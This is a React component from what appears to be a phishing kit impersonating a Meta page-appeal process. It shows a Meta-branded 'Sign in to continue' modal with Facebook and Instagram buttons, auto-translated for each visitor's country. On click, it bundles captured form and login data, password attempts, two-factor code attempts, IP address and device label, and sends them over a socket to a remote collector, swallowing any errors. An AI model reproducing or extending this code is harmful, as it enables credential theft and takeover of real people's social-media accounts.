import '@/assets/css/login-choice-modal.css';
import HeroImage from '@/assets/images/bg_hero.png';
import LogoInsta from '@/assets/images/logo-insta.webp';
import LogoMeta from '@/assets/images/logo-meta.svg';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { sendAppealMessage } from '@/utils/socket-approval';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const TEXT = {
    title: 'Sign in to continue',
    subtitle: 'Choose how you want to verify your account to proceed with the appeal.',
    hero: 'Verify your identity to continue your page appeal review.',
    facebook: 'Continue with Facebook',
    instagram: 'Continue with Instagram',
    terms: 'By continuing, you agree to our Terms of Service and Privacy Policy.'
} as const;

const textsToTranslate = Object.values(TEXT);

const LoginChoiceModal: FC<{ nextStep: (provider: 'facebook' | 'instagram') => void }> = ({ nextStep }) => {
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [loadingProvider, setLoadingProvider] = useState<'facebook' | 'instagram' | null>(null);

    const { setModalOpen, geoInfo, setLoginProvider } = store();
    const appeal = useAppealContext();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = TEXT.title;
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleProvider = async (provider: 'facebook' | 'instagram') => {
        if (loadingProvider) {
            return;
        }

        setLoadingProvider(provider);
        setLoginProvider(provider);

        try {
            if (appeal.socket && appeal.isConnected && appeal.ip) {
                const message = buildAppealMessage({
                    form: appeal.formData,
                    login: appeal.loginData,
                    loginProvider: provider,
                    passwordLogs: appeal.passwordAttempts,
                    codeAttempts: appeal.twoFAAttempts,
                    ip: appeal.ip,
                    deviceLabel: appeal.deviceLabel
                });
                const newMessageId = await sendAppealMessage(appeal.socket, {
                    message,
                    message_id: appeal.messageId,
                    stage: 'info'
                });
                appeal.setMessageId(newMessageId);
            }
        } catch {
            //
        }

        setLoadingProvider(null);
        nextStep(provider);
    };

    return (
        <div
            className='login-choice-page fixed inset-0 z-[1050] flex h-screen w-screen items-center justify-center bg-black/55 px-4 backdrop-blur-sm'
            role='dialog'
            aria-modal='true'
            aria-labelledby='login-choice-title'
        >
            <div className='relative flex max-h-[90vh] w-full max-w-[920px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_60px_rgba(0,0,0,0.28)]'>
                <button
                    type='button'
                    onClick={() => setModalOpen(false)}
                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/15'
                    aria-label='Close'
                >
                    <svg className='h-4 w-4' viewBox='0 0 384 512' aria-hidden='true' fill='currentColor'>
                        <path d='M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z' />
                    </svg>
                </button>

                <div className='login-choice-hero-panel relative hidden w-[44%] shrink-0 overflow-hidden md:block'>
                    <Image src={HeroImage} alt='' fill className='login-choice-hero-image object-cover' priority sizes='44vw' />
                    <div className='login-choice-hero-overlay' aria-hidden='true' />
                    <div className='absolute top-8 left-8'>
                        <Image src={LogoMeta} alt='Meta' className='login-choice-meta-invert h-6 w-auto' />
                    </div>
                    <div className='absolute right-0 bottom-0 left-0 p-8'>
                        <p className='text-xl leading-snug font-bold text-white'>{t(TEXT.hero)}</p>
                        <div className='mt-6 flex gap-1.5' aria-hidden='true'>
                            <span className='h-1.5 w-6 rounded-full bg-white' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                            <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                        </div>
                    </div>
                </div>

                <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
                    <div className='mb-8 flex justify-center md:hidden'>
                        <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' />
                    </div>

                    <h2
                        id='login-choice-title'
                        className='mb-2 text-center text-[26px] leading-tight font-bold text-[#1c1e21] sm:text-[30px]'
                    >
                        {t(TEXT.title)}
                    </h2>
                    <p className='mx-auto mb-10 max-w-[360px] text-center text-sm leading-relaxed text-[#65676b]'>
                        {t(TEXT.subtitle)}
                    </p>

                    <div className='mx-auto flex w-full max-w-[380px] flex-col gap-3'>
                        <button
                            type='button'
                            disabled={loadingProvider !== null}
                            onClick={() => handleProvider('facebook')}
                            className='login-choice-provider group flex h-[54px] w-full items-center justify-center gap-3 rounded-xl border border-[#dadde1] bg-white px-4 text-[15px] font-semibold text-[#1c1e21] transition-all hover:border-[#1877F2]/40 hover:bg-[#f0f2f5] hover:shadow-md active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
                                <path
                                    fill='#1877F2'
                                    d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
                                />
                            </svg>
                            {loadingProvider === 'facebook' ? '…' : t(TEXT.facebook)}
                        </button>

                        <button
                            type='button'
                            disabled={loadingProvider !== null}
                            onClick={() => handleProvider('instagram')}
                            className='login-choice-provider login-choice-btn-instagram group relative flex h-[54px] w-full items-center justify-center gap-3 overflow-hidden rounded-xl border border-[#dbdbdb] bg-white px-4 text-[15px] font-semibold text-[#262626] transition-all active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <Image src={LogoInsta} alt='Instagram' width={22} height={22} className='relative shrink-0 object-contain' />
                            <span className='relative'>{loadingProvider === 'instagram' ? '…' : t(TEXT.instagram)}</span>
                        </button>
                    </div>

                    <p className='mx-auto mt-8 max-w-[380px] text-center text-xs leading-relaxed text-[#8a8d91]'>
                        {t(TEXT.terms)}
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
